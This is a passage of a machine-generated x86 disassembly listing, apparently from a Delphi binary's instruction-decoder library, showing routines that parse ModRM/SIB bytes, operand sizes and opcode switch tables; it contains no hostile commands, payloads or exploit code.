loc_4070FA:				; DATA XREF: sub_4070D4+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4070F9
; ---------------------------------------------------------------------------

loc_407101:				; CODE XREF: sub_4070D4:loc_4070F9j
					; DATA XREF: sub_4070D4+20o
		pop	ebp
		retn
sub_4070D4	endp

; ---------------------------------------------------------------------------
		align 4
off_407104	dd offset dword_407108	; DATA XREF: CODE:004071ABo
					; sub_408628+111r ...
dword_407108	dd 322E0211h, 30h, 0	; DATA XREF: CODE:off_407104o
		dd 0FFFFFFFFh, 0
		dd 64616D09h, 41736944h, 0C08B6D73h
off_407128	dd offset dword_40712C	; DATA XREF: CODE:004071B3o
					; sub_408888+39Br
dword_40712C	dd 342E0211h, 1Ch, 0	; DATA XREF: CODE:off_407128o
		dd 0FFFFFFFFh, 0
		dd 64616D09h, 41736944h, 0C08B6D73h
off_40714C	dd offset dword_407150	; DATA XREF: CODE:004071BBo
					; sub_408888+49Cr ...
dword_407150	dd 362E0211h, 0Ch, 0	; DATA XREF: CODE:off_40714Co
		dd 0FFFFFFFFh, 0
		dd 64616D09h, 41736944h, 0C08B6D73h
off_407170	dd offset dword_407174	; DATA XREF: CODE:004071C3o
dword_407174	dd 372E020Eh, 14h, 1	; DATA XREF: CODE:off_407170o
		dd offset off_401018
		dd 10h
off_407188	dd offset dword_40718C	; DATA XREF: sub_4092B0+2Er
					; sub_40AB44+18r ...
dword_40718C	dd 46540D0Eh, 74636E75h, 496E6F69h, 406F666Eh, 5000000h
					; DATA XREF: CODE:off_407188o
		db 3 dup(0)
		dd offset off_401018
		db 18h
		db 3 dup(0)
		dd offset off_407104
		db 1Ch
		db 3 dup(0)
		dd offset off_407128
		db 20h
		db 3 dup(0)
		dd offset off_40714C
		db 24h
		db 3 dup(0)
		dd offset off_407170
		db 2Ch
		dd 90000000h

; =============== S U B	R O U T	I N E =======================================


sub_4071CC	proc near		; CODE XREF: sub_408888+45p
		mov	eax, offset sub_402FBC
		retn
sub_4071CC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4071D4	proc near		; CODE XREF: sub_408888:loc_408978p
		mov	eax, offset loc_4030E8
		retn
sub_4071D4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4071DC	proc near		; CODE XREF: sub_408888:loc_4089D7p
		mov	eax, offset loc_4032A8
		retn
sub_4071DC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4071E4	proc near		; CODE XREF: sub_408888:loc_4088EFp
		mov	eax, offset loc_403270
		retn
sub_4071E4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4071EC	proc near		; CODE XREF: sub_408368+85p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	al, 1
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		movzx	edx, word ptr [edx]
		cmp	edx, 0F0h
		jg	short loc_407211
		jz	short loc_407243
		sub	edx, 66h
		jz	short loc_407221
		dec	edx
		jz	short loc_407238
		jmp	loc_4072AA
; ---------------------------------------------------------------------------

loc_407211:				; CODE XREF: sub_4071EC+14j
		sub	edx, 0F2h
		jz	short loc_40724E
		dec	edx
		jz	short loc_407280
		jmp	loc_4072AA
; ---------------------------------------------------------------------------

loc_407221:				; CODE XREF: sub_4071EC+1Bj
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-4]
		mov	byte ptr [edx],	1
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+18h]
		mov	dword ptr [edx], 2
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_407238:				; CODE XREF: sub_4071EC+1Ej
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+68h]
		mov	byte ptr [edx],	1
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_407243:				; CODE XREF: sub_4071EC+16j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+64h]
		mov	byte ptr [edx],	1
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_40724E:				; CODE XREF: sub_4071EC+2Bj
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+60h]
		mov	byte ptr [edx],	1
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-8]
		cmp	byte ptr [edx],	0Fh
		jz	loc_407303
		mov	edx, [ebp+arg_0]
		cmp	dword ptr [edx+14h], 0
		jz	loc_407303
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+4], ecx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_407280:				; CODE XREF: sub_4071EC+2Ej
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+5Ch]
		mov	byte ptr [edx],	1
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-8]
		cmp	byte ptr [edx],	0Fh
		jz	short loc_407303
		mov	edx, [ebp+arg_0]
		cmp	dword ptr [edx+14h], 0
		jz	short loc_407303
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+4], ecx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4072AA:				; CODE XREF: sub_4071EC+20j
					; sub_4071EC+30j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		and	dx, 0E7h
		cmp	dx, 26h
		jnz	short loc_4072D8
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		movzx	edx, word ptr [edx]
		shr	edx, 3
		and	dl, 3
		inc	edx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-0Ch]
		mov	[ecx], dl
		jmp	short loc_407303
; ---------------------------------------------------------------------------

loc_4072D8:				; CODE XREF: sub_4071EC+D0j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		add	edx, 0FFFFFF9Ch
		sub	dx, 2
		jnb	short loc_407301
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		sub	dl, 60h
		inc	edx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-0Ch]
		mov	[ecx], dl
		jmp	short loc_407303
; ---------------------------------------------------------------------------

loc_407301:				; CODE XREF: sub_4071EC+FCj
		xor	eax, eax

loc_407303:				; CODE XREF: sub_4071EC+74j
					; sub_4071EC+81j ...
		pop	ebp
		retn
sub_4071EC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407308	proc near		; CODE XREF: sub_408368+104p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		mov	edx, [ebp+arg_0]
		add	edx, 0FFFFFFF8h
		mov	ecx, [edx]
		mov	cl, [ecx]
		mov	[eax], cl
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+48h]
		mov	byte ptr [ecx],	0
		mov	cl, [eax]
		and	cl, 0C0h
		cmp	cl, 0C0h
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+44h]
		setnz	byte ptr [ecx]
		mov	cl, [eax]
		and	cl, 7
		and	ecx, 0FFh
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+40h]
		mov	[ebx], ecx
		xor	ecx, ecx
		mov	cl, [eax]
		shr	ecx, 3
		and	ecx, 7
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+3Ch]
		mov	[ebx], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+34h]
		xor	ebx, ebx
		mov	[ecx], ebx
		inc	dword ptr [edx]
		mov	cl, [eax]
		and	cl, 0C0h
		sub	cl, 40h
		jz	short loc_40737A
		sub	cl, 40h
		jz	short loc_407388
		jmp	short loc_4073AF
; ---------------------------------------------------------------------------

loc_40737A:				; CODE XREF: sub_407308+69j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	dword ptr [ecx], 1
		jmp	short loc_4073B9
; ---------------------------------------------------------------------------

loc_407388:				; CODE XREF: sub_407308+6Ej
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+68h]
		cmp	byte ptr [ecx],	0
		jz	short loc_4073A1
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	dword ptr [ecx], 2
		jmp	short loc_4073B9
; ---------------------------------------------------------------------------

loc_4073A1:				; CODE XREF: sub_407308+89j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	dword ptr [ecx], 4
		jmp	short loc_4073B9
; ---------------------------------------------------------------------------

loc_4073AF:				; CODE XREF: sub_407308+70j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		xor	ebx, ebx
		mov	[ecx], ebx

loc_4073B9:				; CODE XREF: sub_407308+7Ej
					; sub_407308+97j ...
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+44h]
		cmp	byte ptr [ecx],	0
		jz	loc_4074B8
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+68h]
		cmp	byte ptr [ecx],	0
		jz	loc_4074B8
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		cmp	dword ptr [ecx], 0
		jl	short loc_40740F
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		cmp	dword ptr [ecx], 3
		jg	short loc_40740F
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		mov	ecx, [ecx]
		and	ecx, 1
		add	ecx, 6
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+38h]
		mov	[ebx], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+34h]
		mov	dword ptr [ecx], 1

loc_40740F:				; CODE XREF: sub_407308+D8j
					; sub_407308+E3j
		test	byte ptr [eax],	0C0h
		jnz	short loc_40743C
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		cmp	dword ptr [ecx], 6
		jnz	short loc_40743C
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	dword ptr [ecx], 2
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 0FFFFFFFFh
		jmp	loc_40755F	; jumptable 0040744D default case
; ---------------------------------------------------------------------------

loc_40743C:				; CODE XREF: sub_407308+10Aj
					; sub_407308+115j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		mov	ecx, [ecx]
		cmp	ecx, 7		; switch 8 cases
		ja	loc_40755F	; jumptable 0040744D default case
		jmp	off_407454[ecx*4] ; switch jump
; ---------------------------------------------------------------------------
off_407454	dd offset loc_407474	; DATA XREF: sub_407308+145r
		dd offset loc_407474	; jump table for switch	statement
		dd offset loc_407485
		dd offset loc_407485
		dd offset loc_407496
		dd offset loc_4074A7
		dd offset loc_407485
		dd offset loc_407474
; ---------------------------------------------------------------------------

loc_407474:				; CODE XREF: sub_407308+145j
					; DATA XREF: sub_407308:off_407454o
		mov	ecx, [ebp+arg_0] ; jumptable 0040744D cases 0,1,7
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 3
		jmp	loc_40755F	; jumptable 0040744D default case
; ---------------------------------------------------------------------------

loc_407485:				; CODE XREF: sub_407308+145j
					; DATA XREF: sub_407308:off_407454o
		mov	ecx, [ebp+arg_0] ; jumptable 0040744D cases 2,3,6
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 5
		jmp	loc_40755F	; jumptable 0040744D default case
; ---------------------------------------------------------------------------

loc_407496:				; CODE XREF: sub_407308+145j
					; DATA XREF: sub_407308:off_407454o
		mov	ecx, [ebp+arg_0] ; jumptable 0040744D case 4
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 6
		jmp	loc_40755F	; jumptable 0040744D default case
; ---------------------------------------------------------------------------

loc_4074A7:				; CODE XREF: sub_407308+145j
					; DATA XREF: sub_407308:off_407454o
		mov	ecx, [ebp+arg_0] ; jumptable 0040744D case 5
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 7
		jmp	loc_40755F	; jumptable 0040744D default case
; ---------------------------------------------------------------------------

loc_4074B8:				; CODE XREF: sub_407308+BAj
					; sub_407308+C9j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		cmp	dword ptr [ecx], 4
		jnz	short loc_407537
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+44h]
		cmp	byte ptr [ecx],	0
		jz	short loc_407537
		mov	ecx, [edx]
		mov	cl, [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+48h]
		mov	[ebx], cl
		inc	dword ptr [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+48h]
		mov	cl, [ecx]
		and	cl, 7
		and	ecx, 0FFh
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+40h]
		mov	[ebx], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+48h]
		mov	cl, [ecx]
		and	cl, 38h
		cmp	cl, 20h
		jz	short loc_407537
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+48h]
		movzx	ecx, byte ptr [ecx]
		shr	ecx, 6
		mov	ebx, 1
		shl	ebx, cl
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+34h]
		mov	[ecx], ebx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+48h]
		movzx	ecx, byte ptr [ecx]
		shr	ecx, 3
		and	ecx, 7
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+38h]
		mov	[ebx], ecx

loc_407537:				; CODE XREF: sub_407308+1B9j
					; sub_407308+1C4j ...
		test	byte ptr [eax],	0C0h
		jnz	short loc_40755F ; jumptable 0040744D default case
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		cmp	dword ptr [ecx], 5
		jnz	short loc_40755F ; jumptable 0040744D default case
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	dword ptr [ecx], 4
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+40h]
		mov	dword ptr [ecx], 0FFFFFFFFh

loc_40755F:				; CODE XREF: sub_407308+12Fj
					; sub_407308+13Fj ...
		mov	ecx, [edx]	; jumptable 0040744D default case
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+2Ch]
		mov	[ebx], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	ecx, [ecx]
		dec	ecx
		jz	short loc_40757E
		dec	ecx
		jz	short loc_40759A
		sub	ecx, 2
		jz	short loc_4075B6
		jmp	short loc_4075D0
; ---------------------------------------------------------------------------

loc_40757E:				; CODE XREF: sub_407308+26Aj
		mov	ecx, [edx]
		movsx	ecx, byte ptr [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+28h]
		mov	[ebx], ecx
		mov	ecx, [edx]
		movzx	ecx, byte ptr [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+24h]
		mov	[ebx], ecx
		jmp	short loc_4075E4
; ---------------------------------------------------------------------------

loc_40759A:				; CODE XREF: sub_407308+26Dj
		mov	ecx, [edx]
		movsx	ecx, word ptr [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+28h]
		mov	[ebx], ecx
		mov	ecx, [edx]
		movzx	ecx, word ptr [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+24h]
		mov	[ebx], ecx
		jmp	short loc_4075E4
; ---------------------------------------------------------------------------

loc_4075B6:				; CODE XREF: sub_407308+272j
		mov	ecx, [edx]
		mov	ecx, [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+28h]
		mov	[ebx], ecx
		mov	ecx, [edx]
		mov	ecx, [ecx]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx+24h]
		mov	[ebx], ecx
		jmp	short loc_4075E4
; ---------------------------------------------------------------------------

loc_4075D0:				; CODE XREF: sub_407308+274j
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+28h]
		xor	ebx, ebx
		mov	[ecx], ebx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+24h]
		xor	ebx, ebx
		mov	[ecx], ebx

loc_4075E4:				; CODE XREF: sub_407308+290j
					; sub_407308+2ACj ...
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+30h]
		mov	ecx, [ecx]
		add	[edx], ecx
		mov	al, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+4], al
		pop	ebx
		pop	ebp
		retn
sub_407308	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4075FC	proc near		; CODE XREF: sub_408368+15Ep

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+54h]
		mov	eax, [eax]
		and	eax, 0C00h
		sub	eax, 400h
		jz	short loc_407623
		sub	eax, 400h
		jz	short loc_40762A
		sub	eax, 400h
		jz	short loc_407631
		jmp	short loc_40763B
; ---------------------------------------------------------------------------

loc_407623:				; CODE XREF: sub_4075FC+15j
		mov	eax, 1
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_40762A:				; CODE XREF: sub_4075FC+1Cj
		mov	eax, 2
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_407631:				; CODE XREF: sub_4075FC+23j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+18h]
		mov	eax, [eax]
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_40763B:				; CODE XREF: sub_4075FC+25j
		xor	eax, eax
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		sub	dx, 9Ah
		jz	short loc_407662
		add	edx, 0FFFFFFFAh
		sub	dx, 4
		jb	short loc_407676
		sub	dx, 24h
		jz	short loc_40766F
		sub	dx, 22h
		jnz	short loc_40768D

loc_407662:				; CODE XREF: sub_4075FC+4Fj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+18h]
		mov	eax, [eax]
		add	eax, 2
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_40766F:				; CODE XREF: sub_4075FC+5Ej
		mov	eax, 3
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_407676:				; CODE XREF: sub_4075FC+58j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+68h]
		cmp	byte ptr [eax],	0
		jz	short loc_407688
		mov	eax, 2
		jmp	short loc_40768D
; ---------------------------------------------------------------------------

loc_407688:				; CODE XREF: sub_4075FC+83j
		mov	eax, 4

loc_40768D:				; CODE XREF: sub_4075FC+2Cj
					; sub_4075FC+33j ...
		mov	edx, eax
		dec	edx
		jz	short loc_40769C
		dec	edx
		jz	short loc_4076AF
		sub	edx, 2
		jz	short loc_4076C2
		jmp	short loc_4076D4
; ---------------------------------------------------------------------------

loc_40769C:				; CODE XREF: sub_4075FC+94j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-8]
		movsx	edx, byte ptr [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+1Ch]
		mov	[ecx], edx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4076AF:				; CODE XREF: sub_4075FC+97j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-8]
		movsx	edx, word ptr [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+1Ch]
		mov	[ecx], edx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4076C2:				; CODE XREF: sub_4075FC+9Cj
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-8]
		mov	edx, [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+1Ch]
		mov	[ecx], edx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4076D4:				; CODE XREF: sub_4075FC+9Ej
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+1Ch]
		xor	ecx, ecx
		mov	[edx], ecx
		pop	ebp
		retn
sub_4075FC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4076E0	proc near		; CODE XREF: sub_408368+16Ap

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+54h]
		cmp	dword ptr [eax], 0FFFFh
		setnz	al
		test	al, al
		jz	loc_407BDC	; jumptable 00407731 default case
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		cmp	word ptr [edx],	0FFh
		jbe	loc_407A5C
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		and	edx, 0FFh
		cmp	edx, 6Ch
		jge	loc_4077E9
		cmp	edx, 19h
		jge	short loc_40779C
		cmp	edx, 18h	; switch 25 cases
		ja	loc_407BDC	; jumptable 00407731 default case
		jmp	off_407738[edx*4] ; switch jump
; ---------------------------------------------------------------------------
off_407738	dd offset loc_40789F	; DATA XREF: sub_4076E0+51r
		dd offset loc_4078B0	; jump table for switch	statement
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_4078DF
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_4078DF
		dd offset loc_4078DF
		dd offset loc_4078DF
		dd offset loc_4078E6
		dd offset loc_407BDC
		dd offset loc_40790A
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_407BDC
		dd offset loc_40792C
; ---------------------------------------------------------------------------

loc_40779C:				; CODE XREF: sub_4076E0+46j
		cmp	edx, 22h
		jg	short loc_4077C5
		jz	loc_407950
		add	edx, 0FFFFFFE7h
		sub	edx, 7
		jb	loc_4078DF	; jumptable 00407731 cases 4,10-12
		jz	loc_407950
		dec	edx
		jz	loc_40797F
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4077C5:				; CODE XREF: sub_4076E0+BFj
		sub	edx, 23h
		jz	loc_40797F
		dec	edx
		sub	edx, 4
		jb	loc_4078DF	; jumptable 00407731 cases 4,10-12
		add	edx, 0FFFFFFF2h
		sub	edx, 0Ah
		jb	loc_4078DF	; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4077E9:				; CODE XREF: sub_4076E0+3Dj
		cmp	edx, 0BAh
		jg	short loc_407857
		jz	loc_407A4B
		cmp	edx, 0AEh
		jg	short loc_40782E
		jz	loc_4079CA
		add	edx, 0FFFFFF94h
		sub	edx, 2
		jb	loc_4079BD
		add	edx, 0FFFFFFFDh
		sub	edx, 3
		jb	loc_4079AE
		add	edx, 0FFFFFFFCh
		sub	edx, 6
		jb	loc_4078DF	; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_40782E:				; CODE XREF: sub_4076E0+11Dj
		sub	edx, 0B2h
		jz	loc_407A0F
		add	edx, 0FFFFFFFEh
		sub	edx, 2
		jb	loc_407A0F
		add	edx, 0FFFFFFFEh
		sub	edx, 2
		jb	loc_4078DF	; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407857:				; CODE XREF: sub_4076E0+10Fj
		cmp	edx, 0D6h
		jg	short loc_407884
		jz	loc_407A1C
		sub	edx, 0C3h
		jz	loc_407A0F
		sub	edx, 4
		jz	loc_407A0F
		sub	edx, 9
		jz	short loc_4078DF ; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407884:				; CODE XREF: sub_4076E0+17Dj
		sub	edx, 0E6h
		jz	loc_407A1C
		sub	edx, 0Ah
		jz	short loc_4078DF ; jumptable 00407731 cases 4,10-12
		sub	edx, 0Fh
		jz	short loc_4078DF ; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_40789F:				; CODE XREF: sub_4076E0+51j
					; DATA XREF: sub_4076E0:off_407738o
		mov	eax, [ebp+arg_0] ; jumptable 00407731 case 0
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 5
		setle	al
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4078B0:				; CODE XREF: sub_4076E0+51j
					; DATA XREF: sub_4076E0:off_407738o
		mov	eax, [ebp+arg_0] ; jumptable 00407731 case 1
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 5
		jz	short loc_4078D1
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_4078D8
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 3
		jg	short loc_4078D8

loc_4078D1:				; CODE XREF: sub_4076E0+1D9j
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4078D8:				; CODE XREF: sub_4076E0+1E4j
					; sub_4076E0+1EFj
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4078DF:				; CODE XREF: sub_4076E0+51j
					; sub_4076E0+CDj ...
		xor	eax, eax	; jumptable 00407731 cases 4,10-12
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4078E6:				; CODE XREF: sub_4076E0+51j
					; DATA XREF: sub_4076E0:off_407738o
		mov	eax, [ebp+arg_0] ; jumptable 00407731 case 13
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jz	short loc_4078FC
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 1
		jle	short loc_407903

loc_4078FC:				; CODE XREF: sub_4076E0+20Fj
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407903:				; CODE XREF: sub_4076E0+21Aj
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_40790A:				; CODE XREF: sub_4076E0+51j
					; DATA XREF: sub_4076E0:off_407738o
		mov	eax, [ebp+arg_0] ; jumptable 00407731 case 15
		mov	eax, [eax-8]
		mov	al, [eax]
		add	al, 0F8h
		cmp	al, 0B7h
		ja	short loc_407924
		and	eax, 0FFh
		bt	dword_407BE0, eax

loc_407924:				; CODE XREF: sub_4076E0+236j
		setb	al
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_40792C:				; CODE XREF: sub_4076E0+51j
					; DATA XREF: sub_4076E0:off_407738o
		mov	eax, [ebp+arg_0] ; jumptable 00407731 case 24
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jz	short loc_407942
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 3
		jle	short loc_407949

loc_407942:				; CODE XREF: sub_4076E0+255j
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407949:				; CODE XREF: sub_4076E0+260j
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407950:				; CODE XREF: sub_4076E0+C1j
					; sub_4076E0+D3j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407971
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		jg	short loc_407971
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 1
		jnz	short loc_407978

loc_407971:				; CODE XREF: sub_4076E0+279j
					; sub_4076E0+284j
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407978:				; CODE XREF: sub_4076E0+28Fj
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_40797F:				; CODE XREF: sub_4076E0+DAj
					; sub_4076E0+E8j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_4079A0
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 3
		jle	short loc_4079A7
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 6
		jge	short loc_4079A7

loc_4079A0:				; CODE XREF: sub_4076E0+2A8j
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4079A7:				; CODE XREF: sub_4076E0+2B3j
					; sub_4076E0+2BEj
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4079AE:				; CODE XREF: sub_4076E0+137j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		mov	al, [eax]
		xor	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4079BD:				; CODE XREF: sub_4076E0+12Bj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		mov	al, [eax]
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_4079CA:				; CODE XREF: sub_4076E0+11Fj
		mov	eax, [ebp+arg_0]
